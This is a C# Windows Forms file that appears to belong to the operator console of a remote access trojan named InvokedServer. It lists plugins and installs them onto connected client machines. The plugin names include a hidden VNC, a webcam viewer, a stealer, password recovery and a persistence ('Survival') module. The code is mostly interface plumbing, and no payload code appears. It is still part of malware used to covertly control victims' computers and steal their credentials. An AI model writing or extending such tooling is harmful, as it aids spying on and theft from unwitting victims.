

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;


namespace InvokedServer.Forms
{
	public partial class FrmPlugins : Form
	{
		private readonly List<string> AllPluginFileNames = new List<string>()
		{
		  "PluginRemoteDesktop.dll",
		  "PluginHVNC.dll",
		  "PluginRemoteWebcam.dll",
		  "PluginStealer.dll",
		  "PluginPasswordRecovery.dll",
		  "PluginSurvival.dll"
		};
		private string _pluginPath = "Plugins\\";
		private string PluginWordString = "Plugin";
		private string suffix = ".dll";
		private readonly string _windowname = "Plugin Viewer";
		private readonly Client _connectClient;
		private readonly PluginViewerHandler _pluginViewerHandler;
		private static readonly Dictionary<Client, FrmPlugins> OpenedForms = new Dictionary<Client, FrmPlugins>();

		public static FrmPlugins CreateNewOrGetExisting(Client client)
		{
			if (FrmPlugins.OpenedForms.ContainsKey(client))
				return FrmPlugins.OpenedForms[client];
			FrmPlugins newOrGetExisting = new FrmPlugins(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmPlugins.OpenedForms.Remove(client));
			FrmPlugins.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmPlugins(Client client)
		{
			this._connectClient = client;
			this._pluginViewerHandler = new PluginViewerHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient) + " *Client Disconnected*";
		}

		private void FrmPlugins_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient);
			this.OnResize(EventArgs.Empty);
			this._pluginViewerHandler.GetLoadedPlugins();
		}

		private void FrmPlugins_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
			this._pluginViewerHandler.Dispose();
		}

		private void PluginsDataGridView_onMouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button != MouseButtons.Left || this.PluginsDataGridView.HitTest(e.X, e.Y) != DataGridView.HitTestInfo.Nowhere)
				return;
			this.PluginsDataGridView.ClearSelection();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._pluginViewerHandler.NewPlugins += new PluginViewerHandler.LoadedPluginsHandler(this.PopulateList);
			MessageHandler.Register((IMessageProcessor)this._pluginViewerHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._pluginViewerHandler);
			this._pluginViewerHandler.NewPlugins -= new PluginViewerHandler.LoadedPluginsHandler(this.PopulateList);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private string MakeSizeString(int bytelength)
		{
			double num1 = (double)bytelength / 1024.0;
			double num2 = num1 / 1024.0;
			return num2 < 1.0 ? string.Format("{0} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2);
		}

		private void AddToDataGridView(string plugName, string pluginSize, bool loaded)
		{
			DataGridViewRow row = this.PluginsDataGridView.Rows[this.PluginsDataGridView.Rows.Add()];
			row.Cells["StatusCol"].Value = loaded ? (object)"Loaded" : (object)"Not Loaded";
			row.Cells["NameCol"].Value = (object)plugName;
			row.Cells["SizeCol"].Value = (object)pluginSize;
			row.Cells["FlagCol"].Value = loaded ? (object)this.DataGridFlagImageList.Images[0] : (object)this.DataGridFlagImageList.Images[1];
		}

		private void PopulateList(object sender, List<string> plugins)
		{
			this.PluginsDataGridView.Rows.Clear();
			List<Tuple<string, string>> tupleList = new List<Tuple<string, string>>();
			foreach (string allPluginFileName in this.AllPluginFileNames)
			{
				if (File.Exists(this._pluginPath + allPluginFileName) && allPluginFileName.Contains(this.PluginWordString))
				{
					int num = allPluginFileName.IndexOf(this.PluginWordString);
					if (num != -1)
					{
						int startIndex = num + this.PluginWordString.Length;
						string str = allPluginFileName.Substring(startIndex).Trim();
						if (str.EndsWith(this.suffix, StringComparison.OrdinalIgnoreCase))
							str = str.Substring(0, str.Length - this.suffix.Length);
						int length = File.ReadAllBytes(this._pluginPath + allPluginFileName).Length;
						Tuple<string, string> tuple = Tuple.Create<string, string>(str, this.MakeSizeString(length));
						tupleList.Add(tuple);
					}
				}
			}
			if (plugins.Count != 0)
			{
				foreach (string plugin in plugins)
				{
					string plug = plugin;
					bool flag = false;
					foreach (Tuple<string, string> tuple in tupleList)
					{
						if (tuple.Item1 == plug)
						{
							flag = true;
							this.AddToDataGridView(plug, tuple.Item2, true);
							tupleList.RemoveAll((Predicate<Tuple<string, string>>)(foundtuple => foundtuple.Item1 == plug));
							break;
						}
					}
					if (!flag)
						this.AddToDataGridView(plug, "??", true);
				}
			}
			foreach (Tuple<string, string> tuple in tupleList)
				this.AddToDataGridView(tuple.Item1, tuple.Item2, false);
			this.PluginsDataGridView.ClearSelection();
			this.StatusToolStripStatusLabel.Text = "Status: Updated";
			this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_blue;
		}

		private void btnGetLogs_Click(object sender, EventArgs e)
		{
			this.StatusToolStripStatusLabel.Text = "Status: Fetching loaded plugins from client memory..";
			this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_orange;
			this._pluginViewerHandler.GetLoadedPlugins();
		}

		private bool FindPluginsAndInstall()
		{
			bool flag = false;
			if (this.PluginsDataGridView.SelectedRows.Count == 0)
				return false;
			foreach (DataGridViewRow selectedRow in (BaseCollection)this.PluginsDataGridView.SelectedRows)
			{
				string str1 = (string)selectedRow.Cells["StatusCol"].Value;
				string pluginName = (string)selectedRow.Cells["NameCol"].Value;
				if (!selectedRow.IsNewRow && str1 != "Loaded")
				{
					string str2 = "Plugin" + pluginName + ".dll";
					if (this.AllPluginFileNames.Contains(str2))
						this._pluginViewerHandler.InstallPlugin(this._pluginPath + str2, pluginName);
					else
						flag = true;
				}
			}
			return !flag;
		}

		private void btnInstall_Click(object sender, EventArgs e)
		{
			if (this.FindPluginsAndInstall())
			{
				this.StatusToolStripStatusLabel.Text = "Status: Succesfully Installed Plugin(s)";
				this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_green;
			}
			else
			{
				this.StatusToolStripStatusLabel.Text = "Status: Error Installing Plugin(s)";
				this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_red;
			}
		}
	}
}